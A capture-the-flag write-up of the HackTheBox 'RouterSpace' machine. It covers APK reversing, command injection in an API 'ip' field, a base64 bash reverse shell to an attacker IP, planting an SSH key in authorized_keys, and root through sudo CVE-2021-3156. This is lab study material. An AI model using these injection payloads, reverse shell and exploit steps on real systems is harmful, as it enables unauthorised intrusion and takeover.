# RouterSpace Writeup

## Enumeration

### Nmap

First, let's scan for open ports using `nmap`. We can quickly scan for open ports and store them in a variable: `ports=$(nmap -p- --min-rate=1000 -T4 10.129.145.44 | grep "^[0-9]" | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)`. Then, we can scan those specific ports in depth by running `nmap`'s built-in scripts: `nmap -p$ports -sC -sV 10.129.145.44`.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     (protocol 2.0)
| ssh-hostkey:
|   3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA)
|   256 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA)
|_  256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519)
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-RouterSpace Packet Filtering V1
80/tcp open  http
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-93510
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 67
|     ETag: W/"43-5AQ/3yeu6I127HUQ7/Y7ENtaNIE"
|     Date: Tue, 01 Mar 2022 01:38:31 GMT
|     Connection: close
|     Suspicious activity detected !!! {RequestID: m mGL rt 7 E }
|   GetRequest:
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-5226
|     Accept-Ranges: bytes
|     Cache-Control: public, max-age=0
|     Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT
|     ETag: W/"652c-17d476c9285"
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 25900
|     Date: Tue, 01 Mar 2022 01:38:31 GMT
|     Connection: close
|     <!doctype html>
|     <html class="no-js" lang="zxx">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>RouterSpace</title>
|     <meta name="description" content="">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/owl.carousel.min.css">
|     <link rel="stylesheet" href="css/magnific-popup.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/themify-icons.css">
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-67833
|     Allow: GET,HEAD,POST
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 13
|     ETag: W/"d-bMedpZYGrVt1nR4x+qdNZ2GqyRo"
|     Date: Tue, 01 Mar 2022 01:38:31 GMT
|     Connection: close
|     GET,HEAD,POST
|   RTSPRequest, X11Probe:
|     HTTP/1.1 400 Bad Request
|_    Connection: close
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: RouterSpace
```

Scan for UDP services with `sudo nmap -sU -r -T5 10.129.145.44 -v`. This finds nothing:

```
PORT   STATE  SERVICE
22/udp closed ssh
80/udp closed http
```

### Website (Port `80`)

Let's brute force directories with `ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.129.145.44/FUZZ -fs 50-90`:

```
css                     [Status: 301, Size: 173, Words: 7, Lines: 11]
fonts                   [Status: 301, Size: 177, Words: 7, Lines: 11]
img                     [Status: 301, Size: 173, Words: 7, Lines: 11]
js                      [Status: 301, Size: 171, Words: 7, Lines: 11]
```

This does not find anything.

Clicking the download button on the website downloads a RouterSpace.apk file.

### Android App (Downloaded APK)

#### Dynamic Approach (Hours of Time = Nothing)

I first tried to figure out what this android app did via dynamic debugging. This took many hours and I never could get it to work. The static approach was much more simpler and easy to understand for me. Anyway, here is the record of things I tired:
 
We need an android emulator to dynamically debug this application. I tried [Android Studio](https://developer.android.com/studio), [Genymotion](https://www.genymotion.com/), and [Anbox](https://anbox.io/). I wasn't able to use any of them to extract the necessary information from the app, but Android Studio is the best option since it comes directly from Google, the makers of Android.

I used Android Studio to start a emulated Android phone and then I dragged and dropped the RouterSpace APK onto it to install it. Next, clicking on the button causes creates a popup that says there is no internet connection. So, it must be trying to make some kind of network request. I made sure the HackTheBox VPN was connected and added `routerspace.htb` to my `/etc/hosts` file. I did this because the release arena machine IP addresses are all different while the app never changed. Therefore, the app didn't have a hardcoded IP address and instead would need to do a DNS lookup. I assumed the machine would follow the pattern of previous HackTheBox machines so I used `routerspace.htb`.

Then, I tried capturing network traffic with a variety of tools. All of them worked and captured traffic, but none of them captured the RouterSpace application's network requests since they never went through. Anyway, I tried [HTTP Toolkit](https://httptoolkit.tech/) with [this guide](https://httptoolkit.tech/blog/inspect-any-android-apps-http/), BurpSuite by following [this guide](https://portswigger.net/support/configuring-an-android-device-to-work-with-burp)(make sure BurpSuite is listening on all interfaces when you add the proxy), and [mitmproxy](https://mitmproxy.org/) ([GitHub Repo](https://github.com/mitmproxy/mitmproxy)). After trying all of these the app still gave the connection error. For BurpSuite and mitmproxy, I added the proxy details within the Android Studio emulator settings window (HTTP Toolkit uses a VPN connection created via their app instead of a system-wide proxy). [mitmproxy](https://mitmproxy.org/) is probably the best tool here if all you want to do is capture network traffic since it is really simple to use. BurpSuite is more powerful, but is more complicated to set up and we don't need its extra features here.

Next, I installed [Genymotion](https://www.genymotion.com/) since I thought maybe the Android Studio emulator wasn't working properly. I created a device and installed the RouterSpace app. The app still refused to connect. I tried both BurpSuite and mitmproxy, but didn't capture any network traffic from the app.

At this point, I literally created a fresh Ubuntu machine. I installed [Anbox](https://anbox.io/) via snap by running `snap install --devmode --beta anbox` and installed the RouterSpace application by first getting the `adb` command with `sudo apt install android-tools-adb` and then running `adb install RouterSpace.apk`. I tried both mitmproxy and BurpSuite by adding the proxies with this command: `adb shell settings put global http_proxy <ip>:<port>` (command from [this StackOverflow answer](https://stackoverflow.com/a/47476009)), but still could not get network traffic from the app.

#### Static Approach (Quick and Easy)

I first tried using [JADX](https://github.com/skylot/jadx) shows that it is a React Native application. I used `apktool d RouterSpace.apk` to decompile and then in the `assets` folder there will be a `index.android.bundle` file containing the React Native Application. Tried using [jsnice.org](http://jsnice.org) on this whole file but also used [richardfuca/react-native-decompiler](https://github.com/richardfuca/react-native-decompiler) to hopefully clean up the code a little. It turns out that just using [jsnice.org](http://jsnice.org) is better once you find the relevant code snippet. Searching for the "connet" string, which I observed in an error message when emulating the app, finds the actually important code. I originally thought that trying to manually reverse this would be difficult, but it isn't too hard.

First, I copied out the `__d` function that contained the word "connet" and put it in [code_1.js](reversing_app/code_1.js) with some basic automatic formatting. I put [code_1.js](reversing_app/code_1.js) through [jsnice.org](http://jsnice.org), which cleaned it up a little, and pasted the output in [code_2.js](reversing_app/code_2.js). Then, I began simplifying and deobfuscating the code in [code_3.js](reversing_app/code_3.js). I created [code_4.js](reversing_app/code_4.js) once I figured out how the `render` function's `output` variable was modified. I used the `node` console to run bits of code to avoid having to completely reverse them. Eventually, I was able to determine what was in the `data` dictionary. I pasted the whole thing into the `node` shell so it would evaluate it and then I printed it out, which revealed this:

```
{
  gUnlE: 'info',
  uAiCt: 'Hey !',
  PpdRl: 'Router is working fine!.',
  JHvFI: '[ DEBUG ] Router is working fine!.',
  vESlr: [Function: vESlr],
  SZqEq: '[ RESPOND ] ',
  EKNxl: 'error',
  DKyDg: 'Unable to connet to the server !',
  XvhFJ: 'Please check your internet connection.',
  shxxV: '[ DEBUG ] Please check your internet connection.',
  OgZoU: [Function: OgZoU],
  mGNnc: 'Sorry !',
  HrHYj: 'Please provide an IP Address.',
  tzoEq: '[ DEBUG ] Please provide an IP Address.',
  EwCVL: 'http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess',
  ugPGw: 'RouterSpaceAgent',
  UWIVj: 'application/json',
  OLDvc: 'transparent',
  gKQYs: 'Check Status',
  YnNsf: 'bottom',
  GHjuW: '0.0.0.0'
}
```

As we can see under the `EwCVL` key there is the URL the app tries to access. So, the code `searchSelect2(249) + searchSelect2(192) + searchSelect2(156) + searchSelect2(205) + searchSelect2(195) + searchSelect2(161) + searchSelect2(238)` evaluates to `http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess`.

We can figure out that `searchSelect2(241)` evaluates to `EwCVL`, which means `data[searchSelect2(241)]` evaluates to the URL.

After simplifying the code and evaluating a lot of the calls to `searchSelect2` in [code_5.js](reversing_app/code_5.js), we see that the app performs a post request to `http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess` with the headers `User-Agent: RouterSpaceAgent` and `Content-Type: application/json`. The app sends at least one key value pair as JSON. We know that the key is `ip` since the app checks to make sure it is not `0.0.0.0`.

### API

Trying to make the same request as the app does, we write the following:

```
curl -X POST -H "User-Agent: RouterSpaceAgent" -H "Content-Type: application/json" --data '{"ip": "0.0.0.0"}' http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess
```

This just returns our input, `0.0.0.0`, back to use.

Next, we try a command injection:

```
curl -X POST -H "User-Agent: RouterSpaceAgent" -H "Content-Type: application/json" --data '{"ip": ";whoami"}' http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess
```

This returns `"\npaul\n"`. So, we have a command injection!

## Foothold

### Revere Shell (Didn't Work)

In theory, we can exploit this command injection with a basic `bash` reverse shell. Start a listener with netcat (`nc -nvlp 58437`) or `pwncat` (`pwncat-cs -lp 58437`). Then, we can encode the reverse shell `bash -i >& /dev/tcp/10.10.15.49/58437 0>&1` to base64 with `echo -n "bash -i >& /dev/tcp/10.10.15.49/58437 0>&1" | base64` to get `YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS40OS81ODQzNyAwPiYx`. We encode to base64 to remove illegal characters. Now, our payload is `;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS40OS81ODQzNyAwPiYx | base64 -d | bash` (we need to `;` at the front so we can run it after whatever command is being run).

We can use `curl` to execute our payload by running the following command:

```
curl -X POST -H "User-Agent: RouterSpaceAgent" -H "Content-Type: application/json" --data '{"ip": ";echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS40OS81ODQzNyAwPiYx | base64 -d | bash"}' http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess
```

However, running this did not work. In fact, I couldn't even ping my attacker machine from the target box with a command like this:

```
curl -X POST -H "User-Agent: RouterSpaceAgent" -H "Content-Type: application/json" --data '{"ip": ";ping -c 3 10.10.14.14 &"}' http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess
```

So, instead I just added my SSH public key to the `paul` user's `~/.ssh/authorized_keys` file.

### `authorized_keys` file

We can add our ssh public key to by running this command:

```
curl -X POST -H "User-Agent: RouterSpaceAgent" -H "Content-Type: application/json" --data '{"ip": ";echo '\''[PUBLIC KEY TEXT HERE]'\'' > /home/paul/.ssh/authorized_keys"}' http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess
```

The `'\''` sequence is used to escape the single quote (`'`) and was learned from [this StackOverflow answer](https://stackoverflow.com/a/39802572).

## Privilege Escalation

Now, we can connect with `ssh paul@routerspace.htb -i /home/kali/.ssh/id_rsa` (or `pwncat-cs paul@routerspace.htb --identity /home/kali/.ssh/id_rsa`).

We upload LinPEAS (`upload linpeas.sh` in `pwncat`) and run it with `bash linpeas.sh`. This doesn't show much but says `sudo` version `1.8.31` is installed, which we can also see by running `sudo -V`.

Searching for "sudo 1.8.31 exploit" finds [CVE-2021-3156](https://nvd.nist.gov/vuln/detail/CVE-2021-3156) and [this associated blog post](https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit). [Here is a video by LiveOverflow about CVE-2021-3156](https://www.youtube.com/watch?v=TLa2VqcGGEQ).

We can run the following command to see if we are vulnerable ([from sudo advisory](https://www.sudo.ws/security/advisories/unescape_overflow/)):

```
sudoedit -s '\' `perl -e 'print "A" x 65536'`
```

This outputs the following, which means `sudo` is vulnerable:

```
malloc(): corrupted top size
Aborted (core dumped)
```

We can exploit this vulnerability to get root using [CptGibbon/CVE-2021-3156](https://github.com/CptGibbon/CVE-2021-3156). Download the repo to your attacker machine with `git clone https://github.com/CptGibbon/CVE-2021-3156.git` and then upload the `Makefile`, `shellcode.c`, and `exploit.c` files. Finally, run `make` and `./exploit` to get a shell as root.

Now, just `cat /root/root.txt` to get the `root.txt` flag.
